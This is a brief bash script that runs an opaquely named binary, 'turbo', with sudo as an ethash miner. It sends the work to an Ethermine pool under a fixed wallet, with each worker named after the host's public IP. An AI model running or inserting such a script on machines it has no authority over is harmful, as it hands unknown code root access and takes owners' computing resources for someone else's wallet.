#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET=0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./turbo && sudo ./turbo -a ethash -o $POOL -u $WALLET.$WORKER $@
